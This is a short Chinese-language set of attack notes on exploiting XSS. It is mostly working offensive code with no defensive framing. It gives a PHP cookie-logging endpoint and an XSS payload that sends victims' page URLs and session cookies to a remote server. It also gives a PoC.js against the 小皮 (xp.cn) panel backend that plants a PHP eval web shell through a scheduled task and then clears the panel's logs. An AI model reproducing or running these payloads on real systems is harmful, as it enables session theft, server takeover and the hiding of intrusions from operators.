## 1.凭证窃取

```PHP
<?php
	$url = $_GET('u');
	$cookie = $_GET('c');
	$fp = fopen('cookie.txt',"a");//打开文件
	fwrite($fp,$url."||".$cookie."\n");//将获取内容进行写入,通过.进行拼接
	fclose($fp);//关闭文件
?>
```

```HTML
<script>
	var url = 'http://远程PHP文件地址?u='+window.location.href+'&c='+encodeURLComponent(document.cookie);//URL编码cookie防止有特殊字符
	document.write("<img src="+url+"/>");//发起请求
	//fetch(urk);
</script>
```
`fwrite` `fetch`均可发起请求
使用的时候将JS整理为1行，在登陆框提交

## 3.构造数据获取Shell
> 熟悉业务系统的情况下，可以根据流量包请求特征，构造请求从而实现攻击获取Shell

示例：针对小皮面板后台的Poc.js
```JS
function poc() {
    $.get('/service/app/tasks.php?type=task_list', {}, function (data) {
        var id = data.data[0].ID;
        $.post('/service/app/tasks.php?type=exec_task', {
            tid: id
        }, function (res2) {
            $.post('/service/app/log.php?type=clearlog', {

            }, function (res3) { }, "json");


        }, "json");
    }, "json");
}
function save() {
    var data = new Object();
    data.task_id = "";
    data.title = "test";
    data.exec_cycle = "1";
    data.week = "1";
    data.day = "3";
    data.hour = "14";
    data.minute = "20";
    data.shell = 'echo "<?php @eval($_POST[123]);?>" >C:/xp.cn/www/wwwroot/admin/1.php';  //写入的路径，需要知道目标的路径
    $.post('/service/app/tasks.php?type=save_shell', data, function (res) {
        poc();
    }, 'json');
}
save();
```
## 4.XSS-flash钓鱼
